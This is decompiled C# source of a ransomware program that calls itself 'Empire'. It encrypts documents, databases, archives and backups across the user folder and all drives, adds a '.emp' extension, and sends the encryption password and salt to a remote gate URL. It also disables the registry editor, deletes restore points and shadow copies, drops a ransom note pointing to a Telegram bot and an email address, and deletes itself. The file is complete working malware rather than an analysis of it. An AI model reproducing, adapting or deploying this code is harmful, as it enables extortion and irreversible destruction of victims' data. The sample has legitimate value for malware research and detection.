using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Cryptor
{
	// Token: 0x02000006 RID: 6
	internal class Program
	{
		// Token: 0x0600000B RID: 11 RVA: 0x00002072 File Offset: 0x00000272
		public static void Main(string[] args)
		{
			if (!Program.CreateMutex())
			{
				Environment.Exit(0);
				return;
			}
			Program.Run();
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002328 File Offset: 0x00000528
		public static bool CreateMutex()
		{
			bool result;
			Program.currentApp = new Mutex(false, Program.mutex, ref result);
			return result;
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002087 File Offset: 0x00000287
		public static void CloseMutex()
		{
			if (Program.currentApp != null)
			{
				Program.currentApp.Close();
				Program.currentApp = null;
			}
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002348 File Offset: 0x00000548
		private static byte[] AES_Enc(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
				{
					rijndaelManaged.KeySize = 256;
					rijndaelManaged.BlockSize = 128;
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, Program.saltBytes, 1000);
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes((int)((double)rijndaelManaged.KeySize / 8.0));
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes((int)((double)rijndaelManaged.BlockSize / 8.0));
					rijndaelManaged.Mode = CipherMode.CBC;
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
						cryptoStream.Close();
					}
					result = memoryStream.ToArray();
				}
			}
			return result;
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002444 File Offset: 0x00000644
		private static string CreatePassword(int length)
		{
			StringBuilder stringBuilder = new StringBuilder();
			Random random = new Random();
			while (0 < Math.Max(Interlocked.Decrement(ref length), length + 1))
			{
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002498 File Offset: 0x00000698
		public static void GenerateSalt()
		{
			try
			{
				using (RNGCryptoServiceProvider rngcryptoServiceProvider = new RNGCryptoServiceProvider())
				{
					Program.saltBytes = new byte[16];
					rngcryptoServiceProvider.GetBytes(Program.saltBytes);
					Program.salti = string.Join<byte>(",", Program.saltBytes);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00002504 File Offset: 0x00000704
		private static void EncryptFile(string file, string password)
		{
			try
			{
				if (file != Process.GetCurrentProcess().MainModule.FileName && file != Application.StartupPath && file != Directory.GetCurrentDirectory() && !file.ToLower().Contains(Environment.GetFolderPath(Environment.SpecialFolder.System).ToLower().Replace("system32", null)))
				{
					byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
					byte[] array = Encoding.UTF8.GetBytes(password);
					array = SHA256.Create().ComputeHash(array);
					byte[] bytes = Program.AES_Enc(bytesToBeEncrypted, array);
					File.WriteAllBytes(file, bytes);
					File.Move(file, file + Program.extension);
					Program.Logs.Append(file + Environment.NewLine);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000025D4 File Offset: 0x000007D4
		private static void encryptDirectory(string location, string password)
		{
			try
			{
				string validExtensions = string.Concat(new string[]
				{
					".txt",
					".TXT",
					".jar",
					".exe",
					".dat",
					".contact",
					".settings",
					".doc",
					".docx",
					".xls",
					".xlsx",
					".ppt",
					".pptx",
					".odt",
					".jpg",
					".png",
					".jpeg",
					".gif",
					".csv",
					".py",
					".sql",
					".mdb",
					".sln",
					".php",
					".asp",
					".aspx",
					".html",
					".htm",
					".css",
					".md",
					".rtf",
					".yaml",
					".conf",
					".json5",
					".xml",
					".psd",
					".pdf",
					".dll",
					".c",
					".cs",
					".vb",
					".vbs",
					".p12",
					".mp3",
					".mp4",
					".f3d",
					".dwg",
					".cpp",
					".h",
					".chm",
					".chw",
					".msi",
					".zip",
					".rar",
					".mov",
					".rtf",
					".bmp",
					".mkv",
					".avi",
					".apk",
					".lnk",
					".iso",
					".7z",
					".ace",
					".arj",
					".bz2",
					".cab",
					".gzip",
					".gz",
					".tgz",
					".tar.gz",
					".tbz2",
					".tar.bz2",
					".txz",
					".tar.xz",
					".bkf",
					".tar.zip",
					".tar.7z",
					".tib",
					".gho",
					".bak",
					".ab",
					".vbk",
					".scr",
					".fbl",
					".dmp",
					".tmp",
					".wps",
					".com",
					".bat",
					".cmd",
					".msp",
					".cpl",
					".ps1",
					".vbs",
					".js",
					".wsf",
					".cmdx",
					".lzh",
					".tar",
					".uue",
					".xz",
					".z",
					".001",
					".mpeg",
					".mp3",
					".mpg",
					".core",
					".crproj",
					".pdb",
					".ico",
					".pas",
					".db",
					".torrent",
					".sqlite",
					".mysql",
					".dbf",
					".json",
					".postgresql",
					".oracle",
					".nosql",
					".wim",
					".cur",
					".sdb",
					".xsd",
					"",
					".mui",
					".log",
					".rsm"
				});
				IEnumerable<string> files = Directory.GetFiles(location);
				string[] directories = Directory.GetDirectories(location);
				ParallelOptions parallelOptions = new ParallelOptions
				{
					MaxDegreeOfParallelism = 10
				};
				Parallel.ForEach<string>(files, parallelOptions, delegate(string file)
				{
					string text = Path.GetExtension(file);
					if (validExtensions.Contains(text.ToLower()) && text != Program.extension)
					{
						Program.EncryptFile(file, password);
					}
				});
				ParallelOptions parallelOptions2 = new ParallelOptions
				{
					MaxDegreeOfParallelism = 5
				};
				Parallel.ForEach<string>(directories, parallelOptions2, delegate(string directory)
				{
					Program.encryptDirectory(directory, password);
				});
			}
			catch
			{
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002B0C File Offset: 0x00000D0C
		private static void Run()
		{
			try
			{
				Program.password = Program.CreatePassword(50);
				Program.GenerateSalt();
				Program.hwid = Hwid.HWID();
				Program.SendPassword(Program.password, Program.hwid, Program.salti);
				DisableTSK.DisableRegEdit();
				Program.UserFold(Program.password);
				Program.Fix_Drivers(Program.password);
				Program.OtherDrivers(Program.password);
				Program.password = null;
				Program.WriteMessage();
				Program.DeleteRestorePoints();
				Shadow.DelCopy();
				Program.SDel("1");
			}
			catch
			{
			}
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002BA0 File Offset: 0x00000DA0
		private static void UserFold(string password)
		{
			try
			{
				Program.encryptDirectory(Program.userfolder, password);
			}
			catch
			{
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002BD0 File Offset: 0x00000DD0
		private static void Fix_Drivers(string password)
		{
			foreach (string text in Environment.GetLogicalDrives())
			{
				DriveInfo driveInfo = new DriveInfo(text);
				if (driveInfo.DriveType == DriveType.Fixed && !driveInfo.ToString().Contains(Program.C_DIR))
				{
					try
					{
						Program.encryptDirectory(text, password);
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002C34 File Offset: 0x00000E34
		private static void OtherDrivers(string password)
		{
			foreach (string text in Environment.GetLogicalDrives())
			{
				DriveInfo driveInfo = new DriveInfo(text);
				if (driveInfo.DriveType != DriveType.Fixed && !driveInfo.ToString().Contains(Program.C_DIR))
				{
					try
					{
						Program.encryptDirectory(text, password);
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002C98 File Offset: 0x00000E98
		private static void WriteMessage()
		{
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW-TO-DECRYPT.txt";
				string text2 = string.Concat(new string[]
				{
					Program.Mynote,
					Environment.NewLine,
					"Your ID is [",
					Program.hwid,
					"]"
				});
				File.WriteAllText(text, string.Concat(new string[]
				{
					text2,
					Environment.NewLine,
					Environment.NewLine,
					"[[Encrypted Files]]",
					Environment.NewLine,
					Program.Logs.ToString()
				}));
				Process.Start(text);
			}
			catch
			{
			}
		}

		// Token: 0x06000018 RID: 24
		[DllImport("Srclient.dll")]
		public static extern int SRRemoveRestorePoint(int index);

		// Token: 0x06000019 RID: 25 RVA: 0x00002D48 File Offset: 0x00000F48
		private static void DeleteRestorePoints()
		{
			try
			{
				foreach (ManagementBaseObject managementBaseObject in new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions()).GetInstances())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					try
					{
						Program.SRRemoveRestorePoint(int.Parse(managementObject["sequencenumber"].ToString()));
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002DE4 File Offset: 0x00000FE4
		public static void SendPassword(string password, string hwid, string salt)
		{
			try
			{
				string value;
				string value2;
				using (RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider())
				{
					rsacryptoServiceProvider.FromXmlString(Program.publickey);
					value = Convert.ToBase64String(rsacryptoServiceProvider.Encrypt(Encoding.UTF8.GetBytes(password), false));
					value2 = Convert.ToBase64String(rsacryptoServiceProvider.Encrypt(Encoding.UTF8.GetBytes(salt), false));
				}
				string address = Program.gate1;
				using (WebClient webClient = new WebClient())
				{
					NameValueCollection data = new NameValueCollection
					{
						{
							"Password",
							value
						},
						{
							"Hwid",
							hwid
						},
						{
							"Salt",
							value2
						}
					};
					byte[] bytes = webClient.UploadValues(address, "POST", data);
					Encoding.UTF8.GetString(bytes);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00002ED0 File Offset: 0x000010D0
		public static void SDel(string delay)
		{
			try
			{
				Process.Start(new ProcessStartInfo
				{
					Arguments = string.Concat(new string[]
					{
						"/C choice /C Y /N /D Y /T ",
						delay,
						" & Del \"",
						new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name,
						"\""
					}),
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					FileName = "cmd.exe"
				});
			}
			catch
			{
			}
		}

		// Token: 0x04000006 RID: 6
		public static string gate1 = "http://a0902054.xsph.ru/one.php";

		// Token: 0x04000007 RID: 7
		public static string mutex = "ntyUBXFQTHyHkrn";

		// Token: 0x04000008 RID: 8
		public static string mail = "HowToDecryptReserve@proton.me";

		// Token: 0x04000009 RID: 9
		public static string urltgbot = "https://t.me/how_to_decrypt_bot";

		// Token: 0x0400000A RID: 10
		public static string publickey = "<RSAKeyValue><Modulus>7raY9jQP+Z0yh/yAnuy39gCHVtsr+6+nTIc6V3x+iu/5D1mfF9kTmF7sbe09kKvwxum3whfWguO5jjpz0awTtMb0Px+ot87tdAQwrifP8IYtBfdhHVJLGKTGDKR0g4HGCq1Piuui0NahHO+hHxgw91jri1O6DwPlNvUsAX1h/c47T0qFzJVOYTlqKYiHDzP0aSpAZw73kR33vq80q87H+A12SDWQY5a7sjIOaRKEoIPxbVvyu2n/2p5HvR+D/sCu+wdT2jslCKdhJGVmm3BNO/SW1XnvLDNoaZoCaeFi0AG7fK+K7SN//vS8Ru11fEpNHP1JmsYX0IN1J4znu2lOzQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

		// Token: 0x0400000B RID: 11
		public static string extension = ".emp";

		// Token: 0x0400000C RID: 12
		public static string password;

		// Token: 0x0400000D RID: 13
		private static byte[] saltBytes;

		// Token: 0x0400000E RID: 14
		private static string salti;

		// Token: 0x0400000F RID: 15
		private static string hwid;

		// Token: 0x04000010 RID: 16
		private static string C_DIR = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));

		// Token: 0x04000011 RID: 17
		private static string userfolder = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

		// Token: 0x04000012 RID: 18
		public static string Mynote = string.Concat(new string[]
		{
			"Empire welcomes you!\r\n--------------------\r\nAll your files are securely encrypted by our software.\r\nUnfortunately, nothing will be restored without our key and decryptor.\r\nIn this regard, we suggest you buy our decryptor to recover your information.\r\nTo communicate, use the Telegram bot at this link\r\n\n",
			Program.urltgbot,
			"\r\n\nIf the bot is unavailable, then write to the reserve email address: ",
			Program.mail,
			"\r\n\r\nThere you will receive an up-to-date contact for personal communication.\r\n--------------------\r\n\r\nDo not try to recover files yourself, they may break and we will not be able to return them, also try not to turn off your computer until decryption."
		});

		// Token: 0x04000013 RID: 19
		public static StringBuilder Logs = new StringBuilder();

		// Token: 0x04000014 RID: 20
		public static Mutex currentApp;
	}
}
